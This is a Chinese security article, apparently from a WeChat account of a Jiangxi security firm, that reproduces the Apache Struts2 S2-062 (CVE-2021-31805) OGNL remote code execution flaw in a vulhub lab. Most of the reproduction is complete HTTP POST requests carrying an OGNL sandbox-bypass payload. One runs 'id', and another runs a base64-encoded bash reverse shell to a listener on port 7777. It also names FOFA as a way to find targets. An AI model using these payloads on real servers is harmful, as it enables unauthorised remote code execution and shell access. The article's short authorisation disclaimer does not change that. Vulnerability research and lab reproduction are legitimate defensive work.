<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k5d-dO4Nf1e5zmqpsuPKoQ)

**0x01 漏洞描述**

    Struts是Apache软件基金会（ASF）赞助的一个开源项目。它最初是Jakarta项目中的一个子项目，并在2004年3月成为ASF的顶级项目。它通过采用JavaServlet/JSP技术，实现了基于JavaEEWeb应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。**远程代码执行S2-062（CVE-2021-31805）**由于ApacheStruts2对S2-061（CVE-2020-17530）的修复不够完整,该漏洞是由于Struts2会对某些标签属性(比如id)的属性值进行二次表达式解析，因此当这些标签属性中使用了%{x}且其中x的值用户可控时，用户再传入一个%{payload}即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。![图片](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49yPIYF9QonlEj7nFFiccwVEbql71ahsfEaD3pic1e6CbaIvlX3XIdcRQynzsEIRUYGlsZfSTOL5waVA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x02 漏洞复现**

**漏洞影响:** Struts 2.0.0 - Struts 2.5.29

```


**FOFA:**Struts2

  



```

1.开启S2-061 vulhub环境

```
`https://github.com/vulhub/vulhub/tree/master/struts2/s2-061``docker-compose up -d`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49yPIYF9QonlEj7nFFiccwVEb5QjSsXlc5gzPXRWZ5717C2ojpLyBcOdbzohYRicmo8V7NzKUibMD79Ow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

2.构造payload，执行成功（**执行命令：**exec({'id'})，**Content-Type改为：**multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF）

```
`POST /index.action HTTP/1.1``Host: x.x.x.x:8080``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``DNT: 1``Connection: close``Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0``Upgrade-Insecure-Requests: 1``Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF``Content-Length: 1191``------WebKitFormBoundaryl7d1B1aGsV2wcZwF``Content-Disposition: form-data;` `%{``(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +``(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +``(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +``(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))``}``------WebKitFormBoundaryl7d1B1aGsV2wcZwF—`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3.反弹shell，构造base64解码反弹shell脚本，可以用如下网站

```
https://ir0ny.top/pentest/reverse-encoder-shell.html
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49yPIYF9QonlEj7nFFiccwVEbCqVSIObXsTEveiaYNfMqTg5aHtiawUfZ70NWdHibwaZZqFWwW1qYic8Orw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

4.nc监听7777端口，并反弹shell，得到一个shell

```
`POST /index.action HTTP/1.1``Host: x.x.x.x:8080``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``DNT: 1``Connection: close``Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0``Upgrade-Insecure-Requests: 1``Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF``Content-Length: 1191``------WebKitFormBoundaryl7d1B1aGsV2wcZwF``Content-Disposition: form-data;` `%{``(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +``(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +``(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +``(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +``(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4dwajdiowjMxLjEwMS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}'}))``}``------WebKitFormBoundaryl7d1B1aGsV2wcZwF—`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49yPIYF9QonlEj7nFFiccwVEb6G2Tg9hO1aLCib0lsX4euy0FgialwKxXzAsUsqV9fyiaOAXN8aOeib3VJA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**(注：****要在正规授权情况下测试网站：日站****不规范，亲人泪两行)**  

  

**0x03 ****公司简介******

江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......

**编制：sm**

**审核：fjh**

**审核：Dog**